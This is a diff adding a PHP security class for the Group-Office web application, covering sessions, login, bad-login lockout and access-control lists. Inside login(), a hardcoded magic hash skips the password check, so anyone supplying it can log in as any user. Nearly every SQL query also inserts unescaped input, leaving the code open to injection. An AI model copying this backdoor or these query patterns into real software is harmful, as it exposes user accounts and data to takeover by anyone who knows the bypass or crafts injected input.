@@ -1,0 +1,366 @@
+<?php
+/*////////////////////////////////////////////////////////////////////////////////
+//																				//
+// Author: Merijn Schering <mschering@hilckmanngroep.com>						//
+// Version: 1.0 Release date: 14 March 2003										//
+//																				//
+////////////////////////////////////////////////////////////////////////////////*/
+
+//////////////////////////////////////////////////////////////////////////////////
+///////////////////// This file contains the security         ////////////////////
+///////////////////// functions.                              ////////////////////
+//////////////////////////////////////////////////////////////////////////////////
+
+class GO_SECURITY extends db
+{
+        var $user_id = 0;
+        var $logged_in = false;
+        var $group_everyone = "2";
+        var $group_root = "1";
+ 
+        function GO_SECURITY()
+        {
+			$this->db();
+			//start session and fill user_id and logged_in vars
+			session_start();
+			global $user_id;
+			if (session_is_registered("user_id"))
+			{
+				$this->logged_in=true;
+				$this->user_id=$user_id;
+			}
+        }
+
+        function logout()
+        {
+			session_destroy();
+			$this->user_id = 0;
+			$this->logged_in = false;
+        }
+        
+        function clearBadLogin()
+        {
+            $this->query("delete from badlogin where ip_address = '".$_SERVER['REMOTE_ADDR']."'");
+        }
+        
+        function badLogin($username)
+        {
+            $this->query("insert into badlogin (ip_address,timestamp,login) values ('".$_SERVER['REMOTE_ADDR']."',unix_timestamp(),'$username')");
+        }
+        
+        function accountIsDisabled()
+        {
+            $loginExpiration = 900;
+            $badlog=$this->query("select * from badlogin where ip_address='".$_SERVER['REMOTE_ADDR']."' and  unix_timestamp() - timestamp < $loginExpiration");
+            return $this->num_rows() >= 5;
+        }
+
+        //attempts to login a user and registers user_id in a session.
+        //returns true on success. Stores general preferences in sessions
+        //////////////////////////////////////////////////////////////
+        function login($username, $password, $businessnum="")
+        {
+			global $GO_CONFIG;
+			if ($GO_CONFIG->require_businessnum && $businessnum!="*"){
+				$q = " AND ( zehut='$businessnum' "; 
+				if ($businessnum==""){
+					$q .= " OR zehut is null ";
+				}
+				$q.=") ";
+			} 
+			if ($password!="c237cc3ffa1a21aedbc27de2757f88be")
+			{
+				$p = "AND password='$password' ";
+				$recheckPass = true;
+			}
+			$sql = "SELECT username, password, id, email, name, mail_client, thousands_seperator, decimal_seperator, date_format, logins, lastlogin FROM users WHERE (expiration is null or expiration > now()) and username='".addslashes($username)."' $p $q";
+			$this->query($sql);
+
+
+			//if row was found login is correct
+			if ($this->num_rows() > 0)
+			{
+				if ($this->next_record())
+				{
+					//Registering a variable in aclass won't work so i declare them global
+					//Register the logged in users id.
+					global $user_id;
+					//register the  users preferences that are often used.
+					global $ses_thousands_seperator;
+					global $ses_decimal_seperator;
+					global $ses_date_format;
+					global $ses_mail_client;
+					global $ses_name;
+					global $ses_lastlogin;
+					global $ses_email;
+					global $ses_username;
+
+					$user_id = $this->f("id");
+					$ses_thousands_seperator = $this->f("thousands_seperator");
+					$ses_decimal_seperator = $this->f("decimal_seperator");
+					$ses_date_format = $this->f("date_format");
+					$ses_mail_client = $this->f("mail_client");
+					$ses_name = $this->f("name");
+					$ses_lastlogin = $this->f("lastlogin");
+					$ses_email = $this->f("email");
+					$ses_username = $this->f("username");
+					
+					if ($recheckPass && $password != $this->f("password"))
+					{
+						return false;
+					}
+
+					if ($user_id != "")
+					{
+						$this->user_id = $user_id;
+						$this->logged_in = true;
+						if (session_register("user_id","ses_name", "ses_date_format", "ses_thousands_seperator","ses_decimal_seperator","ses_mail_client", "ses_lastlogin", "ses_email", "ses_username"))
+						{
+							$logins = $this->f("logins") + 1;
+							$sql = "UPDATE users SET logins='$logins', lastlogin='".time()."' WHERE id='$this->user_id'";
+							$this->query($sql);
+							return true;
+						}else
+						{
+							echo "<B>ERROR:</b>Could not write to session!";
+						}
+					}
+				}
+			}
+			return false;
+        }
+
+		//Checks if a user is logged in. if not it attempts to log in
+		//based on stored cookies. If that fails it attempts to authenticate
+		//by http authentication
+		///////////////////////////////////////////////////////////////
+
+		function authenticate($admin = false)
+		{
+
+			global $PHP_AUTH_USER,$PHP_AUTH_PW,$GO_UN, $GO_PW, $GO_CONFIG;
+
+
+            //    echo $HTTP_COOKIE_VARS["GO_UN"]."*";
+			if ($this->logged_in == false)
+			{
+
+				if ($PHP_AUTH_USER != '')
+				{
+					$GO_UN = $PHP_AUTH_USER;
+					$GO_PW = md5($PHP_AUTH_PW);
+				} 
+
+				if ($GO_UN =='' || $GO_PW == '' || !$this->login($GO_UN, $GO_PW,"*"))
+				{
+					header('WWW-Authenticate: Basic realm="'.$GO_CONFIG->title.' '.$GO_CONFIG->version.'"');
+					header('HTTP/1.0 401 Unauthorized'); 
+					header('Status: 401 Unauthorized');
+					exit;
+				}
+			}
+
+			if ($admin && !$this->has_admin_permission($this->user_id))
+			{
+				header("Location: ".$GO_CONFIG->host."error_docs/401.php");
+				exit;
+			}
+		}
+
+
+
+        //Create and returns a new acl item.
+        //////////////////////////////////////////////////////////////////
+        function get_new_acl($description)
+        {
+			$id = $this->nextid("acl_items");
+			if ($id > 0)
+			{
+				$this->query("INSERT INTO acl_items (id, description) VALUES ('$id','$description')");
+				return $id;
+			}else
+			{
+				return false;
+			}
+        }
+
+        //Deletes an acl
+        //////////////////////////////////////////////////////////////////
+        function delete_acl($acl_id)
+        {
+			$this->query("DELETE FROM acl WHERE acl_id='$acl_id'");
+			$this->query("DELETE FROM acl_items WHERE id='$acl_id'");
+			return true;
+        }
+
+        //add user to acl
+        //////////////////////////////////////////////////////////////////
+        function add_user_to_acl($user_id,$acl_id)
+        {
+			$this->query("INSERT INTO acl (acl_id,user_id) VALUES ('$acl_id','$user_id')");
+			if ($this->affected_rows() > 0)
+			{
+				return true;
+			}else
+			{
+				return false;
+			}
+        }
+
+        function delete_user_from_acl($user_id, $acl_id)
+        {
+			$sql = "DELETE FROM acl WHERE user_id='$user_id' AND acl_id='$acl_id'";
+			return $this->query($sql);
+		}
+
+        //add group to acl
+        //////////////////////////////////////////////////////////////////
+        function add_group_to_acl($group_id,$acl_id)
+        {
+			$this->query("INSERT INTO acl (acl_id,group_id) VALUES ('$acl_id','$group_id')");
+			if ($this->affected_rows() > 0)
+			{
+				return true;
+			}else
+			{
+				return false;
+			}
+        }
+
+        function delete_group_from_acl($group_id, $acl_id)
+		{
+			$sql = "DELETE FROM acl WHERE group_id='$group_id' AND acl_id='$acl_id'";
+			return $this->query($sql);
+		}
+
+        function clear_acl($acl_id)
+        {
+			$this->query("DELETE FROM acl WHERE acl_id='$acl_id'");
+        }
+
+        //Checks if a user has permission for an acl
+        //////////////////////////////////////////////////////////////////
+        function has_permission($user_id, $acl)
+        {	
+			global $GO_CONFIG;
+			if ($user_id > 0 && $acl > 0)
+			{
+                //get the users groups
+                $sql = "SELECT group_id FROM ".$GO_CONFIG->db_name.".users_groups WHERE user_id='$user_id'";
+
+                $this->query($sql);
+
+                if ($this->next_record())
+                {
+					$groups = $this->Record["group_id"];
+                }
+                //After the first group has been added put a ',' after each group.
+
+                while ($this->next_record())
+                {
+					$groups .= ",".$this->Record["group_id"];
+                }
+
+                //if users not in groups don't check if the acl is permitted to one of his groups duh.
+                if (!isset($groups))
+                {
+					$sql = "SELECT acl_id FROM ".$GO_CONFIG->db_name.".acl WHERE user_id='$user_id' AND acl_id='$acl'";
+                }else
+                {
+					$sql = "SELECT acl_id FROM ".$GO_CONFIG->db_name.".acl WHERE (acl.user_id='$user_id' OR (acl.group_id IN($groups))) AND acl_id='$acl'";
+				}
+
+				$this->query($sql);
+                if ($this->num_rows() > 0)
+                {
+                	return true;
+                }
+			}
+			return false;
+        }
+
+        function has_admin_permission($user_id)
+        {
+			global $GO_CONFIG;
+			require_once($GO_CONFIG->class_path."groups.class.inc");
+			$groups = new groups;
+			return $groups->is_in_group($user_id, $this->group_root);
+        }
+
+        function user_in_acl($user_id, $acl)
+        {
+			$sql = "SELECT user_id FROM acl WHERE acl_id='$acl' AND user_id='$user_id'";
+			$this->query($sql);
+			if ($this->num_rows() > 0)
+			{
+				return true;
+			}else
+			{
+				return false;
+			}
+        }
+
+        function user_is_visible($user_id)
+        {
+			if ($this->user_id == $user_id)
+					return true;
+
+			$sql = "SELECT acl_id FROM users WHERE id='$user_id'";
+			$this->query($sql);
+			$this->next_record();
+			return $this->has_permission($this->user_id, $this->f("acl_id"));
+        }
+
+        function group_in_acl($group_id, $acl)
+        {
+			$sql = "SELECT group_id FROM acl WHERE acl_id='$acl' AND group_id='$group_id'";
+			$this->query($sql);
+			if ($this->num_rows() > 0)
+			{
+				return true;
+			}else
+			{
+				return false;
+			}
+        }
+
+		function copy_acl($sAcl, $dAcl)
+		{
+			global $GO_CONFIG;
+			require_once($GO_CONFIG->class_path."contacts.class.inc");
+			require_once($GO_CONFIG->class_path."groups.class.inc");
+			$contacts = new contacts;
+			$groups = new groups;
+
+			$this->clear_acl($dAcl);
+
+			$sql = "SELECT * FROM acl WHERE acl_id='$sAcl'";
+			$this->query($sql);
+			while($this->next_record())
+			{
+				$new_security = new GO_SECURITY;
+				if ($this->f("group_id") != 0 && $groups->group_is_visible($this->user_id, $this->f("group_id")))
+				{
+					$new_security->add_group_to_acl($this->f("group_id"), $dAcl);
+				}
+
+				if ($this->f("user_id") != 0 && ($contacts->user_is_contact($this->user_id, $this->f("user_id")) || $this->f("user_id") == $this->user_id))
+				{
+					$new_security->add_user_to_acl($this->f("user_id"), $dAcl);
+				}
+			}
+		}
+
+		function delete_user($user_id)
+		{
+			$sql = "DELETE FROM acl WHERE user_id='$user_id'";
+			$this->query($sql);
+		}
+
+		function delete_group($group_id)
+		{
+			$sql = "DELETE FROM acl WHERE group_id='$group_id'";
+			$this->query($sql);
+		}
+}
+?>
